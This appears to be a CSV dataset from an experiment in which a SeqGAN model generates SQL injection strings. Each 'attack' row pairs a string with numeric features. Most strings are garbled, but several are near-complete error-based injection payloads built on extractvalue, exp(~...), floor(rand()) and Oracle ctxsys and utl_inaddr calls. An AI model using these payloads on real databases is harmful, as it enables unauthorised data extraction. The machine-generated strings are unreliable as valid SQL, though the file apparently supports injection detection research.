attack,"1""  0   )    (  )    from   (  as x U when   1392 from  =  un   )    )0x717a767a71,0x717a767a71le group 3931 whenduaityyas (  ||chr  0x7171706a71  case from 6082hr    (  select   (  )  select 3440  )    )  )   x   x 1 m union end  ||chr  (  select and   (  ||chr  =  9173   SELECT 5192 D WHERE Gby 9173 A1x  (  4232  select :yualt_aa'",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,142,334.0,53.0,4.3335126759646565,127.0,64.0,114.0,29.0,0.38023952095808383,0.19161676646706588,0.3413173652694611,0.08682634730538923,1.0,1.0,0.0,0.0,0.0,2.0,0.0,16.0,0.0,1.0,1.0,8.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,5.0,1.0,1.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,"1'   (  =  ,0x717a767a71,0x717a767a71,floor  =  )       )   x   x 3931 drnac  (  =  0 8877 else 4493  select  5840  )   FROM    a  D and  I hUwhrNry's duar  er  (  rand  )     =  t_r  (  case        ||chr  chr  8382  select else by rr  (  ||r  selectn  )   )    )  =  )   (  case when group 7158  ,5192i,0x717a767a71,0x717a767a71,0x717a767a71,concat  ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,143,351.0,46.0,4.112341396851878,120.0,75.0,122.0,34.0,0.3418803418803419,0.21367521367521367,0.3475783475783476,0.09686609686609686,2.0,0.0,0.0,0.0,0.0,5.0,0.0,14.0,0.0,1.0,8.0,9.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""   (    )     )   )   from 5584 4607u  0x7171706a710x7171706a716055  case from concat  ||chr  (  =  ,0x717a767a71,concat  (  )    )   6082  case   )    )   from.by else 0 4493r  =  )   (  ,0x717a767a71,     1 when   (  select from 1 0  0and      0,1   )    7562  ||r  113  ||ctr  (  (  select AND 0 SELECT from   a 6082 4386  '  =  'iadrararodr    .chr  (  0x7171706a71113  SELECT",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,144,591.0,49.0,3.901259700471891,163.0,126.0,238.0,64.0,0.27580372250423013,0.2131979695431472,0.4027072758037225,0.10829103214890017,2.0,2.0,0.0,0.0,1.0,4.0,0.0,37.0,0.0,0.0,9.0,11.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,7.0,0.0,0.0,6.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,19.0
attack,"-6TEz  >  =  )   having from from,4493  select  'i'    ||u  rand  122  ||chr  ((  select  )  chr  ||chr r  (  (  (  ||chr  (  case union and  ||UsT  0  )   thenWHERE m  m AND group N concat  (  rand  ||    (  ,   thenx  ||UNp E FROM  (  * end  el_lt_ntass group 1   chr  (  case)having,0x717a767a71,floor  0",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,145,307.0,51.0,4.347583536118555,144.0,20.0,103.0,40.0,0.46905537459283386,0.06514657980456026,0.3355048859934853,0.13029315960912052,2.0,0.0,1.0,0.0,1.0,1.0,0.0,14.0,0.0,2.0,4.0,18.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,1.0,0.0,3.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,9.0
attack,1',error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,146,2.0,2.0,1.0,0.0,1.0,0.0,1.0,0.0,0.5,0.0,0.5,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'ral"" like """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,147,190.0,29.0,3.4668024337631222,46.0,35.0,83.0,26.0,0.24210526315789474,0.18421052631578946,0.4368421052631579,0.1368421052631579,2.0,2.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,5.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"1"" or when   (  (  case ||  113  =  case when   x  =  ||,hr  (  select   )    )    )   )    )     ) and FROM concatx      where R ' and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )   and '(  =  106  rand  )  select end   FROM   (  * 1045  )    )     x from xxxI.rp.s GRE(  ||  case  6055 or c  ||oun   ax.gykr  (  (  *2   )     0x717a767a712   )    )  ,o or when d.Uch",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,148,607.0,51.0,4.014700373128197,211.0,80.0,244.0,72.0,0.34761120263591433,0.13179571663920922,0.40197693574958815,0.1186161449752883,2.0,1.0,0.0,0.0,4.0,4.0,0.0,40.0,0.0,0.0,8.0,17.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,8.0,3.0,1.0,4.0,3.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,23.0
attack,"1%fcchht_als   )    )   (       SELECTIN.r    =  (  select   SELECT where end   nthen 1 3931 else where where 0lannu2   )    )   (  )   )     5023  )   (,1  from   addnayter.sna,  (  ||s 6913 by when.r  (  =  ey",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,149,211.0,40.0,3.956950737937936,88.0,17.0,82.0,24.0,0.41706161137440756,0.08056872037914692,0.3886255924170616,0.11374407582938388,0.0,0.0,0.0,0.0,0.0,2.0,0.0,13.0,1.0,1.0,2.0,4.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,2.0,0.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1'||  (  select '_7562thjutuT   )    )    nt  (  ,0x717a767a71,     *2   (  )   )       selectfrom group m   R   0x717a767a71and:_r  (  ||cr  (  ,  >  0  )   )     5305 1 and  8190  *  =  ||a k 5023  (  select union 1 by E 0x7171706a71 3931 by 0    thenx FROMu   (  --einaxt_r  (  (  ||chr  (  (  )chr  (  (  case Cselect group  L union ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,150,337.0,51.0,4.154049679068467,112.0,54.0,128.0,43.0,0.3323442136498516,0.16023738872403562,0.3798219584569733,0.12759643916913946,2.0,0.0,2.0,0.0,2.0,1.0,0.0,20.0,0.0,3.0,3.0,14.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,2.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1""  ,floor  3440  ,0x717a767a71  --a when  a 1 RI.s from (  )  0  ,  *,  )   (  )  rand  =  3326aT  0  (  (  --2   (     ))   )    )    WHERE AND group 1  1N  chr    se end union whenuthenchruhr  (  (  0  = :-chr  4232  )  =,  0   n     )    6055  and from from ||AND else by LINERT  case,1   x   ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,151,297.0,50.0,4.0793070773736,104.0,35.0,122.0,36.0,0.3501683501683502,0.11784511784511785,0.4107744107744108,0.12121212121212122,0.0,1.0,5.0,0.0,1.0,3.0,0.0,16.0,0.0,0.0,6.0,11.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,3.0,3.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.0
attack,"10x717a767a71""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""2",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,152,213.0,28.0,3.372655845697329,49.0,42.0,95.0,27.0,0.2300469483568075,0.19718309859154928,0.4460093896713615,0.1267605633802817,0.0,2.0,0.0,0.0,1.0,1.0,0.0,18.0,0.0,0.0,4.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"-4493%6237\*o'  =  'sand2   46074232  )   WHERE by FROM LLs or chchr  4386hr  (  or  ,  ||chr  (  (  4232  0x7171706a71,concat  6055  --aytsutal  =  )   (  )   x 3931 5584 x when  selectgetr  (  select   112  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,153,211.0,46.0,4.461562612535714,71.0,50.0,66.0,24.0,0.33649289099526064,0.23696682464454977,0.3127962085308057,0.11374407582938388,2.0,0.0,5.0,0.0,1.0,2.0,0.0,8.0,1.0,0.0,2.0,10.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,1.0,0.0,1.0,1.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1"" then from  select   (  )   (  )  )  )   )     then  SELECT ,  ||chruars 0  else   )    )  ,    )  )     )   thenS 0uintoyyyxless  select RCCT  chpuas   (  case else DIRT  )   or5192 DI  )    ,  =  )       )    )     --  (  )     ,1   (  )    )     a dutxt_r.113  )  ||lhr  (  (  select ",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,154,289.0,42.0,3.517643788307321,101.0,11.0,137.0,40.0,0.3494809688581315,0.03806228373702422,0.4740484429065744,0.1384083044982699,0.0,1.0,2.0,0.0,0.0,1.0,0.0,26.0,0.0,1.0,4.0,7.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,4.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
attack,"1'||  (  select 'ilp     113  FROMaychhr  ||  select dd hr  (  (  122  chr  ,0x717a767a71  )  ||chhr  (    4232  (  casedal_",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,155,124.0,31.0,3.9343191436442146,46.0,20.0,42.0,16.0,0.3709677419354839,0.16129032258064516,0.3387096774193548,0.12903225806451613,2.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0,0.0,1.0,1.0,6.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
attack,"1%""  =  """,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,156,9.0,5.0,2.0588138903312014,0.0,1.0,4.0,4.0,0.0,0.1111111111111111,0.4444444444444444,0.4444444444444444,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%62361     '   WHERE by 1 end   5978     *   FROM DT  ||U 0M and  )  4232  ||cr  (  case when   xrr x.T  (  (  case end  SELECTch (  =  )   )   thenwu,_l_in*(  then union 5023  ( when  from  case 1 5023  case end  (  ||r  (  ,,floor  (  )     ||chr  (   )  select ||  (  rand  ||chr  (  ||chr  extractvalue  (  (  having",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,157,321.0,55.0,4.171442219760076,131.0,25.0,121.0,44.0,0.40809968847352024,0.0778816199376947,0.37694704049844235,0.13707165109034267,1.0,0.0,0.0,0.0,2.0,1.0,0.0,19.0,1.0,2.0,3.0,17.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,6.0
attack,"1'||  (  select 'rNnalb"" like ""asx_nt_ant",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,158,41.0,20.0,4.054480737173679,24.0,1.0,7.0,9.0,0.5853658536585366,0.024390243902439025,0.17073170731707318,0.21951219512195122,2.0,2.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,2.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,"1If_""  =  ""aerardowjunal",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,159,24.0,17.0,3.8868421881310113,15.0,1.0,4.0,4.0,0.625,0.041666666666666664,0.16666666666666666,0.16666666666666666,0.0,2.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   """"  =  ""34510",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,160,212.0,31.0,3.3883717433416227,46.0,37.0,99.0,30.0,0.2169811320754717,0.17452830188679244,0.4669811320754717,0.14150943396226415,0.0,4.0,0.0,0.0,1.0,2.0,0.0,18.0,0.0,0.0,4.0,3.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1'   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  'ayw",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,161,182.0,28.0,3.395322631432654,42.0,35.0,81.0,24.0,0.23076923076923078,0.19230769230769232,0.44505494505494503,0.13186813186813187,2.0,0.0,0.0,0.0,0.0,1.0,0.0,16.0,0.0,0.0,5.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
attack,"-""  4232  0x7171706a71)   from or 2131 when  =hr  (  ,  ||cs     AND    )        (  (  =  selecta Dby LE    n 9627n 0 0 6055  extractvalue  (  )   fromua end   xn   select where select   0  )   x    R  case  end  )    cRrxys.e  t  ||  (  select   '   )     ||  (  case concat  casecxr.syg  =  (  ,>  9173,1   )    ,' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ' union ISNAS",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,162,660.0,50.0,3.8458465794700483,210.0,82.0,278.0,90.0,0.3181818181818182,0.12424242424242424,0.4212121212121212,0.13636363636363635,3.0,1.0,1.0,0.0,0.0,5.0,0.0,44.0,0.0,0.0,5.0,33.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,1.0,1.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,13.0
attack,"1%"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""ouww'  =  'w_'  =  ' and0x717a767a71(  4232  ||  (  ||  extractvalue  *  113        =  4232  )   ,0x717a767a71,1   then  select 7881 FROM (  SELECT byu or )     )#  )  )    from union information_schemach6270  4232  ||chr  (  6237,1     #tdr.ol  )    )    havingI L3931INSNT     )  (  select from 5023  6055  ||  ||  113  *  )  *lo  )   )     ||.chr  (  (  12 3051",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,163,693.0,55.0,4.097780871897347,206.0,113.0,268.0,106.0,0.2972582972582973,0.16305916305916307,0.38672438672438675,0.15295815295815296,4.0,2.0,0.0,0.0,3.0,5.0,0.0,46.0,1.0,5.0,3.0,40.0,1.0,1.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,4.0,1.0,0.0,4.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,12.0
attack,1.18844,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,164,7.0,4.0,1.9502120649147467,0.0,6.0,0.0,1.0,0.0,0.8571428571428571,0.0,0.14285714285714285,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1 || concat  =  select   and)    then (  (  9067),0x717a767a71,floor  --",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,165,72.0,25.0,4.024401919288771,27.0,14.0,20.0,11.0,0.375,0.19444444444444445,0.2777777777777778,0.1527777777777778,0.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,2.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,17562faT  (  ||  (  1392u,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,166,25.0,14.0,3.3638561897747246,4.0,9.0,8.0,4.0,0.16,0.36,0.32,0.16,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,1%%'  =  'bsn,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,167,13.0,8.0,2.7773627950641693,3.0,1.0,4.0,5.0,0.23076923076923078,0.07692307692307693,0.3076923076923077,0.38461538461538464,2.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,2.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,-6VSWx'  =  'loblal,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,168,19.0,13.0,3.471354487013929,10.0,1.0,4.0,4.0,0.5263157894736842,0.05263157894736842,0.21052631578947367,0.21052631578947367,2.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0
attack,"1%'  =  '5606   5032 or by  hr  (  5840  0  --,0x717a767a71,0x717a767a71  ),     )  =  )  )   x2  ||chr  (  6237  (  ||chr  (  1  )   x   or by dy from from  case   (hr  (  =  n du  113  rand  (  t  )  select 1 WHERE   9067 --  =  =     )having 6082 1        0from from ahr  (  =  ,9067 w  ||uelbt_aidrgq_ad.  )",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,169,311.0,47.0,4.075058148973879,90.0,56.0,123.0,42.0,0.28938906752411575,0.18006430868167203,0.3954983922829582,0.13504823151125403,2.0,0.0,4.0,0.0,0.0,6.0,0.0,16.0,1.0,2.0,4.0,16.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,1.0,3.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
attack,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'u"" like ""altzu",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,170,218.0,34.0,3.932127519009339,79.0,37.0,78.0,24.0,0.3623853211009174,0.16972477064220184,0.3577981651376147,0.11009174311926606,2.0,2.0,0.0,0.0,0.0,1.0,0.0,14.0,0.0,0.0,5.0,1.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
attack,"1%3775_""  =  ""  3074  ||chr  (  u  (  ,  ))    *as  ||ehr  (  select 1 AINrM end  )   then  SELECTchrr  (  select from r  =aysx.r  select x 0 union selectu   )     d113  )     )   E union end   )     )       113  ,  =  (     )     when   and   ))   )    )   then from =   from or   =select end  )   fromt x 1210  ||ct_r",error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,171,319.0,45.0,3.7813921757545255,121.0,21.0,138.0,39.0,0.3793103448275862,0.06583072100313479,0.43260188087774293,0.12225705329153605,0.0,2.0,0.0,0.0,1.0,5.0,0.0,19.0,1.0,2.0,2.0,12.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,0.0,1.0,4.0,2.0,0.0,3.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,11.0
attack,1'||  (  select 'fNs,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,172,20.0,12.0,3.341446071165522,9.0,1.0,5.0,5.0,0.45,0.05,0.25,0.25,2.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
attack,1'  =  '  =  e 1 concat  select when    )   M 1 Igroupendi,error,error,seqgan_improved,seqgan_improved__phase3__error__D__200__V8__sql_aware__len160__gpre80__reward_on__seed88,173,58.0,23.0,3.582432743559507,28.0,3.0,22.0,5.0,0.4827586206896552,0.05172413793103448,0.3793103448275862,0.08620689655172414,2.0,0.0,0.0,0.0,0.0,2.0,0.0,1.0,0.0,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
